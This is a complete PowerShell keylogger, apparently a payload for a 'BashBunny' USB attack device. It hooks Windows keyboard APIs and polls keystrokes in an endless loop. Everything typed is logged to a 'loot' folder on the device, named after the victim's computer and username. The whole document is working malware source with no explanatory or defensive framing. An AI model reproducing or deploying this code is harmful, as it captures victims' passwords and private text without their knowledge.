#requires -Version 2
function Log-Keys($Path="$env:temp\a.txt")
{
# Signatures for API Calls
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
	$null = New-Item -Path $Path -ItemType File -Force
	try
	{
		Write-Output 'KeyLogger started'
		while ($true)
		{
			Start-Sleep -Milliseconds 40
			for ($ascii = 9; $ascii -le 254; $ascii++)
			{
				$state = $API::GetAsyncKeyState($ascii)
				# is key pressed?
				if ($state -eq -32767)
				{
					$null = [console]::CapsLock
					$virtualKey = $API::MapVirtualKey($ascii, 3)
					$kbstate = New-Object Byte[] 256
					$checkkbstate = $API::GetKeyboardState($kbstate)
					$mychar = New-Object -TypeName System.Text.StringBuilder
					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
					if ($success)
					{
						[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
					}
				}
			}
		}
	}
	finally
	{
		# Oups, keylogger was terminated :(
	}
}

$Bunny = (gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter)
$folderName = "$Bunny\loot\Keylogger2\$env:computername-$env:username"
try
{
	New-Item -Path $folderName -ItemType directory -Force
}
finally
{
	"Folder exists"
}
$fileName = "$folderName\" + (Get-Date -Format o | foreach {$_ -replace ":", "."}) + ".txt"
Log-Keys($fileName)